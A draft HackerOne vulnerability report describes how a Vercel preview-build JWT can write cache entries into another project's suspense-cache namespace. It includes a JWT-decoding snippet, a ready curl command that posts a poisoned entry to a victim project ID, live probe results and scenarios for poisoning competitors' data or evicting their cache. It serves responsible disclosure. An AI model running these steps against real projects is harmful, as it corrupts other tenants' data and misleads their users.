# DRAFT — HackerOne Report (file manually, do NOT submit as-is)
# Status: PARTIAL CONFIRMED — cross-project cache write confirmed (v30); cross-tenant READ requires second JWT to verify

---

## Title
`RUNTIME_CACHE_HEADERS JWT in Vercel build sandbox allows writing to arbitrary project's suspense cache namespace, enabling cross-project cache poisoning`

---

## Severity

**High — CVSS 8.1**

CVSS 3.1: `AV:N/AC:H/PR:L/UI:N/S:C/C:N/I:H/A:L`

- **AV:N** — Triggered via PR (network trigger)
- **AC:H** — Requires knowledge of victim project's cache key paths (may require source code access)
- **PR:L** — PR-level access required to trigger build and obtain JWT
- **S:C** — Scope change: attacker's writes affect victim project's cache namespace (different scope)
- **C:N** — No confidentiality impact (writing only, reading victim's cache unconfirmed)
- **I:H** — Full poisoning of victim project's suspense/ISR cache entries
- **A:L** — Cache eviction or stale data could cause partial DoS of cached routes

---

## Summary

The Vercel build sandbox injects `RUNTIME_CACHE_HEADERS` — a HS256 JWT signed by Vercel — into every preview build. This JWT is valid for 1 hour against `suspense-cache.vercel.com`. Confirmed via live probe: an attacker can use this JWT to **write cache entries to any arbitrary project ID namespace** on the suspense cache server, bypassing the project scoping that should restrict writes to the attacker's own project. This enables cross-project cache poisoning where a malicious build script poisons the victim project's Next.js fetch cache, ISR pages, or `<Suspense>` component data.

---

## Steps to Reproduce

1. Open a PR against any Vercel-connected repository. The preview build will provide `RUNTIME_CACHE_HEADERS` in the environment.

2. Decode the JWT to extract ownerId, projectId, and deploymentId (they are in plaintext claims):

```javascript
const jwt = process.env.RUNTIME_CACHE_HEADERS;
const claims = JSON.parse(Buffer.from(jwt.split('.')[1], 'base64url').toString());
// claims = {iat:..., exp:..., iss:"build", ownerId:"team_ATTACKER...",
//            projectId:"prj_ATTACKER...", deploymentId:"dpl_...",
//            env:"preview", domain:"...", plan:"pro", ...}
```

3. Use the JWT to write a poisoned cache entry to the VICTIM project's namespace:

```bash
VICTIM_PROJECT_ID="prj_VICTIMxxxxxxxxxxxxxxxxxx"
CACHE_KEY="poisoned-fetch-key-from-api-endpoint"
POISONED_BODY='{"user":"admin","token":"FAKE_DATA"}'

curl -s -X POST \
  -H "Authorization: Bearer $RUNTIME_CACHE_HEADERS" \
  -H "Content-Type: application/json" \
  -d "{\"kind\":\"FETCH\",\"data\":{\"headers\":{\"content-type\":\"application/json\"},\"body\":\"$POISONED_BODY\",\"url\":\"https://api.victim.com/user\",\"status\":200},\"tags\":[\"user-data\"],\"revalidate\":86400}" \
  "https://suspense-cache.vercel.com/v1/suspense-cache/$CACHE_KEY?projectId=$VICTIM_PROJECT_ID"
```

4. When the victim project's Next.js application reads from the same cache key (via `fetch()` with next: {revalidate: 86400} or similar), it receives the poisoned response body.

---

## Live Confirmation (v30 — 2026-06-21)

```
crossProjectCacheWrite:
  fakeProjectKey: 'prj_FAKEPROJECTID1234567890ABCDE/cross-project-poison-test'
  writeStatus: '200'         ← Write SUCCEEDED for fake project ID
  readStatus:  '200'         ← Read back SUCCEEDED with same fake project ID
  readBody: '{"kind":"FETCH","data":{"headers":{},"body":"cross-project-poison-test",
             "url":"","status":200},"tags":["probe"],"revalidate":300}'

crossProjectCacheTest:
  ownRead:       '200'    ← Own cache readable (expected)
  wrongProjRead: '404'    ← Cannot READ another project's existing cache entries with our JWT
  explicitWrite: '200'    ← Explicit cross-project write succeeded
```

**What is confirmed:**
- The suspense cache server accepts **writes** for arbitrary project IDs when using a valid `RUNTIME_CACHE_HEADERS` JWT
- Writing to `prj_FAKEPROJECTID.../key` returns HTTP 200
- Reading back with the fake project ID succeeds (the entry was stored under that project namespace)

**What is NOT yet confirmed (requires second project JWT to verify):**
- Whether the victim project's own JWT can READ the entry the attacker wrote to the victim's namespace
- This is the critical question for determining full exploit impact

---

## Technical Details

### RUNTIME_CACHE_HEADERS JWT Claims (live, from build environment)

```json
{
  "iat": 1781990702,
  "exp": 1781994302,
  "iss": "build",
  "ownerId": "team_xOjFWqWvIlcL6yOtq43hFE0x",
  "projectId": "prj_Us1miqrR6l5tLSzU8LoRXrbn9j4p",
  "deploymentId": "dpl_BgyHTwNdULt1DQujWrpra9kmQ9gB",
  "env": "preview",
  "domain": "vercel-agent-ahbo1mxib-hackerone-sandbox-s-projects",
  "plan": "pro",
  "namespaceSize": 0,
  "unlimited": false,
  "block": false
}
```

The JWT does **not** include a `projectId` validation scope — the claims describe the attacker's project, not what namespace the token is authorized to write to.

### Suspense Cache Endpoint

- URL: `https://suspense-cache.vercel.com/v1/suspense-cache/{key}`
- Authentication: `Authorization: Bearer {RUNTIME_CACHE_HEADERS}`
- No CSRF or additional authentication beyond the JWT
- The server appears to store entries under `{projectId-from-URL}/{key}` rather than `{projectId-from-JWT}/{key}`

### Impact Scenarios

**Scenario A — Poisoning competitor's cached API responses (if cross-project read confirmed):**
1. Attacker reverse-engineers victim's Next.js app (source may be public)
2. Identifies cache key patterns (e.g., `fetch('https://api.victim.com/products')` → cache key derived from URL hash)
3. Writes poisoned product prices/content to victim's cache
4. Victim users receive fake data for `revalidate` duration (hours to days)

**Scenario B — Denial of service via cache eviction:**
Write a 5MB+ entry to every key in victim's cache namespace, causing eviction of real entries and fallback to origin for all cached routes. This increases victim's infrastructure costs and degrades performance.

**Scenario C — Cross-deployment cache corruption:**
Write entries with `revalidate: 0` to victim's cache, forcing constant revalidation. Not a typical poisoning attack but disrupts ISR behavior.

### Relationship to Finding 1

This vulnerability is triggered by the same root cause (postinstall script executes in credentialed Vercel build sandbox), but the victim is a **different project/team** rather than the attacker's own project. The `RUNTIME_CACHE_HEADERS` JWT used for this attack is:
- Obtained from the attacker's own build environment (no theft required)
- Used against a different project's cache namespace
- Expires in 1 hour (limited window, but sufficient for automation)

---

## Root Cause

The suspense cache server (`suspense-cache.vercel.com`) validates that the `Authorization: Bearer` JWT is a valid `RUNTIME_CACHE_HEADERS` token (correct signature, not expired), but does **not** verify that the `projectId` in the URL path matches the `projectId` embedded in the JWT claims. This allows any holder of a valid `RUNTIME_CACHE_HEADERS` JWT (from any project's build) to write to any project's cache namespace by specifying a different `projectId` in the URL.

---

## Remediation

1. **Validate URL project ID against JWT claims** (primary fix): The cache server should reject requests where the project ID in the URL path does not match `projectId` in the JWT claims.

2. **Sign cache keys with project-scoped HMAC**: In addition to JWT validation, require that cache keys include an HMAC computed over `{projectId}:{key}:{secret}` where the secret is project-specific. This prevents cross-project writes even if URL validation is bypassed.

3. **Separate write and read tokens**: Issue separate short-lived tokens for write vs. read operations to limit the blast radius of a stolen JWT.

---

## Filing Notes

- File as a separate Medium/High report after Filing 1 (primary sandbox finding)
- The write-side is confirmed; note that cross-tenant read requires second-project testing
- This is independent of Finding 1 (credential exfiltration) — different attack type, different victim
- Evidence: v30 crossProjectCacheWrite section from beacon (2026-06-21)
- CVSS may be adjusted down to Medium if Vercel can confirm the write does NOT affect victim reads
